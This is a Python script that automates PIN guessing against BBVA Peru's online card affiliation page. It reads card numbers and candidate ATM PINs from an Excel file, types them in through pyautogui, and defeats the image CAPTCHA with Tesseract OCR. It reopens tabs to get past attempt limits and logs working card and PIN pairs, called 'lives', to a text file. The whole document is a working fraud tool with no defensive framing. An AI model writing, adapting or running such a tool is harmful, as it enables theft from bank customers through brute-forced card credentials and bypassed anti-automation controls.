import os #Borrar consola
import pytesseract
from PIL import Image
from collections import Counter

import numpy as np

import pyautogui 
import time
import datetime
from openpyxl import load_workbook # excel

import cv2

import subprocess
#import telegram

pytesseract.pytesseract.tesseract_cmd = r"D:\Tesseract-OCR\tesseract.exe"
#text = pytesseract.image_to_string(Image.open("test5.png"),config='--psm 10 --oem 3 -c tessedit_char_whitelist=01234566789abcdefghijkmnlopqesturstuvwxyz')


#Datos ingresados es incorrecto Y limite superado:
Pos_NumeroTarje = 453,418
Pos_ClaveCajero = 416,579
Pos_CodigoImagen = 492,765
exe = 708,16

#lugar_clave = 349,552
#cancelar = 1502,994
#ok_error = 1641,614
def turnoff():
    t = 60
    subprocess.call("shutdown -s -t %d" %t)
    subprocess.call ( "shutdown -a")


def click (pos,click = 1):
    pyautogui.moveTo(pos)
    pyautogui.click(clicks=click)

def borrar(i):
    for i in range (1,i):
        pyautogui.press('backspace')

def Logeo():
    pyautogui.click(398,342)
    pyautogui.typewrite("4919148300000000")
    pyautogui.click(410,507)
    pyautogui.typewrite("1111")
    pyautogui.click(466,682)
    pyautogui.typewrite("asdasd")
    pyautogui.press("enter")
    time.sleep(2)

def LentraImagen(Imagen):
    p1 = pytesseract.image_to_string(Imagen, config="--psm 7 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
    if p1=="":
        p1 = pytesseract.image_to_string(Imagen, config="--psm 13 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")
        #print(texto) 
    return p1

#Nombre del excel
filesheet = "./Felizanio22.xlsx"
wb = load_workbook(filesheet)
hojas = wb.get_sheet_names()
print(hojas)
nombres = wb.get_sheet_by_name('Hoja1')
wb.close()

os.system ("cls") 
CantidadInicial = input("Escriba desde que numero iniciará:  ")
CantidadInicial = (int(CantidadInicial))
CantidadFinal = input("Escriba desde que numero finalizará:  ")
CantidadFinal = (int(CantidadFinal))

#archivo.write("Dnis \n")


print("\n")
preg = input("¿Logeo?")


print("***************")
print("Presione 'Enter' para continuar")
input()

print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
print()

if preg == "si":
    Logeo()
    time.sleep(2)

reiniciar = 0

url = "https://www.bbva.pe/personas/afiliacion.html"
    
for i in range(CantidadInicial,CantidadFinal):
    try:

        tarjeta, fecha1, fecha2,fecha3,fecha4,fecha5,fecha6 = nombres[f'A{i}:G{i}'][0]
        # fecha 5 1234
        reiniciar = reiniciar + 1
        if reiniciar > 8:
            reiniciar = 0
            time.sleep(1)
            pyautogui.click(305,20) # Nueva pestaña
            time.sleep(0.5)
            pyautogui.typewrite(url.rstrip())
            pyautogui.press('enter')
            time.sleep(8)
            pyautogui.click(266,22) # cerrar pestaña anterior
            time.sleep(1)
            #time.sleep(8)
            Logeo()



        print("N°.", i)

        #Comenzando con la tarjeta
        time.sleep(0.1)
        click(Pos_NumeroTarje,click=2)
        time.sleep(0.1)
        borrar(2)
        time.sleep(0.2)
        click(Pos_NumeroTarje)
        
        print(tarjeta.value)
        pyautogui.typewrite(tarjeta.value)

        #Futuro While-----------------------------------------
        j = 0
        #for j in range(j,4):
        while j < 6:
            j = j + 1
            #time.sleep(0.1)
            #print("borrado")



            click(Pos_ClaveCajero)
            borrar(5)
            click(Pos_ClaveCajero)

            if fecha1.value=="-":
                print("No tiene clave")
                break;
            
            print("-----------------------------------------------------------------")
            if j == 1:
                print(fecha1.value)
                clave= fecha1.value
                pyautogui.typewrite(fecha1.value)
            if j == 2:
                print(fecha2.value)
                pyautogui.typewrite(fecha2.value)
                clave= fecha2.value
            if j == 3:
                print(fecha3.value)
                clave= fecha3.value
                pyautogui.typewrite(fecha3.value)
                
            if j == 4:
                print(fecha4.value)
                clave= fecha4.value
                pyautogui.typewrite(fecha4.value)

            if j == 5:
                print(fecha5.value)
                clave= fecha5.value
                pyautogui.typewrite(fecha5.value)

            if j == 6:
                print(fecha6.value)
                clave= fecha6.value
                pyautogui.typewrite(fecha6.value)
                
            


            click(Pos_CodigoImagen)
            borrar(7)


            Ima1 = pyautogui.screenshot(region=(359,620,34,84)) #588 de altura
            Ima2 = pyautogui.screenshot(region=(390,620,32,84))
            Ima3 = pyautogui.screenshot(region=(418,620,24,84))
            Ima4 = pyautogui.screenshot(region=(442,620,27,84)) #max iquierda
            Ima5 = pyautogui.screenshot(region=(465,620,30,84))
            Ima6 = pyautogui.screenshot(region=(490,620,29,84))

            
            texto = ""

            texto = texto + LentraImagen(Ima1).rstrip() + "|"
            texto = texto + LentraImagen(Ima2).rstrip() + "|"
            texto = texto + LentraImagen(Ima3).rstrip() + "|"
            texto = texto + LentraImagen(Ima4).rstrip() + "|"
            texto = texto + LentraImagen(Ima5).rstrip() + "|"
            texto = texto + LentraImagen(Ima6).rstrip() + "|"

            texto = texto.replace(" ","")


            print("-------------------------")
            print("Texto: "+ texto)
            print("-------------------------")
            texto = texto.replace("|","")
            texto = texto + "iiiiii"

            #texto = p1+p2+p3+p4+p5+p6

            #print("terminó bucle")
            #click(exe)
            #input()

            click (Pos_CodigoImagen)
            pyautogui.typewrite(texto)
           # time.sleep(0.1)

            #click(exe)
            #input()

            pyautogui.press('enter')

            time.sleep(1.7)

            '''
            r = None
            invalido = "error.png"
            time.sleep(1.5)
            r = pyautogui.locateOnScreen(invalido, grayscale=True, confidence=0.9, region=(440,593,85,152))
            #print("r",r)
            if r!=None:
                print("retrocediendo")
                j = j-1 
            '''
            

            rojo =  False
            #try:
            #Color: 464,685(252,223,223)
            rojo = pyautogui.pixelMatchesColor(602,721,(252,223,223))
            time.sleep(0.1)
            print("\n")
            if (rojo is True):
                print("retrocediendo")
                j = j-1 
            if(rojo is False):
                print("Acertado! next")


            #print("...")

            #time.sleep(0.1) 
            
            verificar = None 
            limite = "./Imagenes/LimiteSuperado2.png" # 536 309
            verificar = pyautogui.locateOnScreen(limite, grayscale=True, confidence=0.9, region=(160,214,653,167))
            if verificar!=None:
                print("----------------")
                print("limite Superado")
                print("----------------")
                break

            verificarAfi = None 
            limiteAf = "./Imagenes/Afiliado.png" # 536 309
            verificarAfi = pyautogui.locateOnScreen(limiteAf, grayscale=True, confidence=0.9, region=(160,214,653,167))
            if verificarAfi!=None:
                
                print("----------------")
                print ('\a')
                print("Clave Encontrada!")
                print("----------------")

                lives = open("lives.txt","a")
                lives.write(str(i)) # escribir en el block
                lives.write("\n")
                lives.write(tarjeta.value.rstrip()) # escribir en el block
                lives.write("\n")
                lives.write(str(clave))
                lives.write("\n")
                lives.write("------------------------------------")
                lives.write("\n")
                lives.close()

                break
            '''
            contEmerg = 0
            loc = None
            image = "./Imagenes/testcorrecto.png"
            while loc is None:
            loc = pyautogui.locateOnScreen(image, grayscale=True, confidence=0.9, region=(0,0,541,456))
            #print(loc)
            if loc != None:
                contEmerg = contEmerg + 1
                print("gou")
                time.sleep(0.1)
                #print("Probable error...")
                #time.sleep(5)
                if contEmerg >= 20:
                    contEmerg = 0
                    pyautogui.click(241,59)
                    pyautogui.typewrite(url)
                    pyautogui.press('enter')
                    time.sleep(2)
                    pyautogui.press('f5')
                    time.sleep(8)
                    Logeo()
                    break
            if contEmerg >= 20:
                print()
                '''



            #verificarError = None 
            #limite = "./Imagenes/errorC.png" # 536 309
            #verificar = pyautogui.locateOnScreen(limite, grayscale=True, confidence=0.9, region=(97,510,313,176))
            #if verificar!=None:
             #   reiniciar = 0
              #  time.sleep(1)
               # pyautogui.click(241,59)
                #pyautogui.typewrite(url)
                #pyautogui.press('enter')
                #time.sleep(2)
                #pyautogui.press('f5')
                #time.sleep(8)
                #Logeo()
                #j = 0

            verificar2 = None 
            Live = "./Imagenes/Live2.png"
            verificar2 = pyautogui.locateOnScreen(Live, grayscale=True, confidence=0.9, region=(142,161,674,376))
            if verificar2!=None:
                print("----------------")
                print ('\a')
                print("Clave Encontrada!")
                print("----------------")
               # print("N°.", i)
                reiniciar = 0
                lives = open("lives.txt","a")
                lives.write(str(i)) # escribir en el block
                lives.write("\n")
                lives.write(tarjeta.value.rstrip()) # escribir en el block
                lives.write("\n")
                lives.write(str(clave))
                lives.write("\n")
                lives.write("Bxl")
                lives.write("\n")
                lives.write("------------------------------------")
                lives.write("\n")
                lives.close()

                reiniciar = 0
                time.sleep(1)
                pyautogui.click(305,20) # Nueva pestaña
                time.sleep(1)
                pyautogui.typewrite(url.rstrip())
                pyautogui.press('enter')
                time.sleep(8)
                pyautogui.click(266,22) # cerrar pestaña anterior
                time.sleep(1)
                #time.sleep(8)
                Logeo()
                break

            
        os.system("cls")
        print("Next")
    except Exception as e:
        print("Hubo un error")
        


print("Fin del programa")






    







